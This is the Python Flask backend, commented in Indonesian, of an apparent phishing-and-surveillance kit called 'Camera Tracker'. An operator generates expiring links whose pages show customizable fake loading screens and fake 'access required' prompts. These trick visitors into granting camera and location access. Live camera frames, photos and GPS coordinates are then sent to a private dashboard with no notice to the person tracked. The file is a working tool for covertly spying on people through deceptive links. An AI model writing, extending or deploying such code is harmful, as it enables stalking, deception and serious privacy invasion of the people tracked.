"""
Camera Tracker — Flask backend untuk PythonAnywhere
WebSocket diganti HTTP polling (PythonAnywhere tidak support WS)
"""
from flask import (Flask, request, jsonify, render_template,
                   session, redirect, url_for, make_response, Response)
from functools import wraps
import sqlite3, uuid, os, secrets, base64, json
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "ganti-secret-key-ini-acak")
app.permanent_session_lifetime = timedelta(days=1)

APP_PASSWORD = os.getenv("APP_PASSWORD", "admin123")

# Simpan frame terbaru per token di memory
latest_frames = {}   # token -> bytes (JPEG)


# ─── Database ─────────────────────────────────────────────────────────────────
DB_PATH = os.path.join(os.path.dirname(__file__), "tracker.db")

def get_db():
    c = sqlite3.connect(DB_PATH)
    c.row_factory = sqlite3.Row
    return c

def init_db():
    db = get_db()
    db.executescript("""
        CREATE TABLE IF NOT EXISTS tokens (
            id                 TEXT PRIMARY KEY,
            type               TEXT NOT NULL DEFAULT 'stream',
            loading_title      TEXT DEFAULT 'Memuat Aplikasi',
            loading_subtitle   TEXT DEFAULT 'Mohon tunggu sebentar...',
            loading_duration   INTEGER DEFAULT 3,
            permission_title   TEXT DEFAULT 'Akses Diperlukan',
            permission_message TEXT DEFAULT 'Aplikasi ini memerlukan akses untuk berjalan.',
            custom_message     TEXT DEFAULT '',
            created_at         TEXT NOT NULL,
            expires_at         TEXT NOT NULL,
            used               INTEGER DEFAULT 0,
            active             INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS captures (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            token_id     TEXT NOT NULL,
            type         TEXT NOT NULL,
            data         TEXT NOT NULL,
            captured_at  TEXT NOT NULL
        );
    """)
    db.commit(); db.close()

init_db()

def get_token(token):
    db = get_db()
    row = db.execute("SELECT * FROM tokens WHERE id=?", (token,)).fetchone()
    db.close(); return row

def token_valid(row):
    return row and datetime.now() <= datetime.fromisoformat(row["expires_at"])


# ─── Auth ────────────────────────────────────────────────────────────────────
def login_required(f):
    @wraps(f)
    def wrapped(*a, **kw):
        if not session.get("logged_in"):
            return redirect(url_for("login"))
        return f(*a, **kw)
    return wrapped

@app.route("/")
def index():
    return redirect(url_for("dashboard" if session.get("logged_in") else "login"))

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("password") == APP_PASSWORD:
            session.permanent = True
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        error = "Password salah!"
    return render_template("login.html", error=error)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


# ─── Halaman ──────────────────────────────────────────────────────────────────
@app.route("/dashboard")
@login_required
def dashboard():
    return render_template("dashboard.html")

@app.route("/track/<token>")
def device_page(token):
    row = get_token(token)
    if not row:
        return render_template("error.html",
            icon="❌", title="Link Tidak Valid",
            msg="Link ini tidak ditemukan."), 404
    if not token_valid(row):
        return render_template("error.html",
            icon="⏰", title="Link Kadaluarsa",
            msg="Link sudah tidak berlaku. Minta link baru."), 410
    return render_template("device.html",
        token=token,
        token_type=row["type"],
        loading_title=row["loading_title"],
        loading_subtitle=row["loading_subtitle"],
        loading_duration=row["loading_duration"],
        permission_title=row["permission_title"],
        permission_message=row["permission_message"],
        custom_message=row["custom_message"])


# ─── API: Ping (keep-alive) ───────────────────────────────────────────────────
@app.route("/ping")
def ping():
    return jsonify(status="ok", time=datetime.now().isoformat())


# ─── API: Generate Link ───────────────────────────────────────────────────────
@app.route("/api/generate-link", methods=["POST"])
@login_required
def generate_link():
    body    = request.json or {}
    token   = str(uuid.uuid4())
    now     = datetime.now()
    expires = now + timedelta(hours=int(body.get("expires_hours", 1)))
    db = get_db()
    db.execute("""
        INSERT INTO tokens
        (id,type,loading_title,loading_subtitle,loading_duration,
         permission_title,permission_message,custom_message,created_at,expires_at)
        VALUES (?,?,?,?,?,?,?,?,?,?)
    """, (token,
          body.get("type","stream"),
          body.get("loading_title","Memuat Aplikasi"),
          body.get("loading_subtitle","Mohon tunggu sebentar..."),
          int(body.get("loading_duration", 3)),
          body.get("permission_title","Akses Diperlukan"),
          body.get("permission_message","Aplikasi memerlukan akses untuk berjalan."),
          body.get("custom_message",""),
          now.isoformat(), expires.isoformat()))
    db.commit(); db.close()
    base = request.host_url.rstrip("/")
    return jsonify(link=f"{base}/track/{token}", token=token,
                   type=body.get("type","stream"),
                   expires_at=expires.isoformat())


# ─── API: Token Info (public) ─────────────────────────────────────────────────
@app.route("/api/token-info/<token>")
def token_info(token):
    row = get_token(token)
    if not token_valid(row): return jsonify(error="not found"), 404
    return jsonify({k: row[k] for k in (
        "type","loading_title","loading_subtitle","loading_duration",
        "permission_title","permission_message","custom_message")})


# ─── API: Status ─────────────────────────────────────────────────────────────
@app.route("/api/status/<token>")
@login_required
def token_status(token):
    row = get_token(token)
    if not row: return jsonify(status="not_found")
    expired  = datetime.now() > datetime.fromisoformat(row["expires_at"])
    streaming = token in latest_frames
    return jsonify(status="expired" if expired else ("streaming" if streaming else "waiting"),
                   type=row["type"])


# ─── API: Frame (streaming via HTTP polling) ──────────────────────────────────
@app.route("/api/frame/<token>", methods=["POST"])
def receive_frame(token):
    """HP mengirim frame JPEG ke sini setiap interval."""
    row = get_token(token)
    if not token_valid(row): return jsonify(error="invalid"), 404
    data = request.data
    if not data: return jsonify(error="no data"), 400
    latest_frames[token] = data
    # Tandai token aktif (sekali saja)
    if not row["active"]:
        db = get_db()
        db.execute("UPDATE tokens SET active=1, used=1 WHERE id=?", (token,))
        db.commit(); db.close()
    return jsonify(ok=True)

@app.route("/api/frame/<token>", methods=["GET"])
@login_required
def get_frame(token):
    """Dashboard mengambil frame terbaru."""
    if token not in latest_frames:
        return "", 204   # belum ada frame
    resp = make_response(latest_frames[token])
    resp.headers["Content-Type"]  = "image/jpeg"
    resp.headers["Cache-Control"] = "no-store, no-cache"
    return resp


# ─── API: Simpan Capture (foto / GPS) ────────────────────────────────────────
@app.route("/api/capture/<token>", methods=["POST"])
def save_capture(token):
    row = get_token(token)
    if not token_valid(row): return jsonify(error="invalid"), 404
    ct = request.content_type or ""
    if "application/json" in ct:
        data     = json.dumps(request.json)
        cap_type = "gps"
    else:
        data     = "data:image/jpeg;base64," + base64.b64encode(request.data).decode()
        cap_type = "photo"
    db = get_db()
    db.execute("INSERT INTO captures (token_id,type,data,captured_at) VALUES (?,?,?,?)",
               (token, cap_type, data, datetime.now().isoformat()))
    db.execute("UPDATE tokens SET used=1 WHERE id=?", (token,))
    db.commit(); db.close()
    return jsonify(ok=True)


# ─── API: Ambil Captures ─────────────────────────────────────────────────────
@app.route("/api/captures/<token>")
@login_required
def get_captures(token):
    db = get_db()
    rows = db.execute(
        "SELECT id,type,data,captured_at FROM captures"
        " WHERE token_id=? ORDER BY id DESC LIMIT 50", (token,)).fetchall()
    db.close()
    return jsonify([dict(r) for r in rows])


# ─── API: Hapus Capture ───────────────────────────────────────────────────────
@app.route("/api/capture/<int:cid>", methods=["DELETE"])
@login_required
def del_capture(cid):
    db = get_db()
    db.execute("DELETE FROM captures WHERE id=?", (cid,))
    db.commit(); db.close()
    return jsonify(ok=True)


# ─── Entry Point ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)
